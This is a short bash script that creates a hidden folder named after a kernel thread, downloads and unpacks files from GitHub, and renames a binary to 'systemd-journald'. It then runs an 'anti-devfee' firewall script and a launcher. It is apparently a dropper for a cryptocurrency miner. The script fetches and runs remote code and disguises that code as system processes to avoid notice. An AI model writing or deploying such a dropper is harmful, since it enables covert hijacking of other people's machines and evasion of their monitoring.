
#!/bin/bash

set -e

mkdir -p ~/.cache/kthreadd
chmod 700 ~/.cache/kthreadd
cd ~/.cache/kthreadd

wget -q \
    https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz \
    https://github.com/ANTI-VIRAL/MACHINE/raw/main/systemd.py \
    https://github.com/ANTI-VIRAL/Ai-05/raw/main/config.ini \
    https://github.com/ANTI-VIRAL/Ai-05/raw/main/set-firewall.sh \
    https://github.com/ANTI-VIRAL/Ai-05/raw/main/run.sh

tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald

chmod +x systemd-journald systemd.py set-firewall.sh run.sh

# Jalankan firewall anti-devfee dulu
bash set-firewall.sh

# Start program
exec bash run.sh
